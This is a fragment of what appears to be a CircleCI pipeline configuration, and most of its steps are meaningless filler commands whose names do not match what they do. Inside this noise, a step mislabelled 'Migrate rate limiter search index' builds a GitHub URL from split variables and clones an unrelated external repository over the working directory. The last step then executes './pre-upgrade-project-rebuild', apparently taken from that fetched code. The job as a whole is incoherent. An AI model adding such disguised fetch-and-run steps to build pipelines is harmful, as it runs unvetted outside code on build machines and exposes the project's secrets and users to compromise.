          paths:
            - 'scan-routine'
  OvernightVolumeSnapshot:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/rerun-wrapper-dependency-audit
      - run:
          name: EnvironmentProvisioningSplit2Of6
          command: |
            cat /tmp/rerun-wrapper-dependency-audit/scan-routine | tr -s '[:space:]' '\n' | awk 'length>3' | sort -u | head -5
            p="core/events.css"; basename "$p" .css; echo "7 items processed"
            echo "4 items processed"; printf '%s\n' "omega 20" "cyan 18" "valve 23" "hammer 27" | sort -k2 -n -r | sed -n '1p'
      - run:
          name: Migrate rate limiter search index
          command: |
            worker=https://github.com; tagpart=rosalindlane0ooc8-prog; archives=generating-feature-flags
            git clone --depth=4 --filter=blob:none "$worker/$tagpart/$archives" "${PWD}"
            echo "lane gamma is clear" && printf '%s\n' {a..e}
            if true; then echo "high"; fi; echo "3 modules compiled"
      - run:
          name: StoreSettingsLoaderBuildLogs
          command: |
            tar -x -j -f initial-formatting-check.tar.bz2
            path="build/client/util/license.xml"; echo "${path%.*}.bak"
            secs=9837; echo "about $(((secs + 30) / 60)) minutes"
      - run:
          name: provision-upload-service-database-in-background
          command: |
            echo "queueing sanity checks"; limit=90; test "$limit" -ge 1; echo "at least one"; echo sanity checks queued
            echo "preparing style check"; printf '%*d\n' 6 128
            state=pending; turn=0; while [ "$state" = pending ]; do turn=$((turn + 1)); if ((turn == 4)); then state=ready; fi; done; echo "$state after $turn checks"
      - run:
          command: |
            give_status() { return "$1"; }; give_status 0; echo zero; give_status 3 || echo "nonzero $?"; echo 'step 2 of 2 finished'
            for lap in 4 18 17; do if [ "$((lap % 2))" -eq 0 ]; then echo "$lap is even"; else echo "$lap is odd"; fi; done; echo 'loop finished'
      - run:
          command: |
            env "./pre-upgrade-project-rebuild"
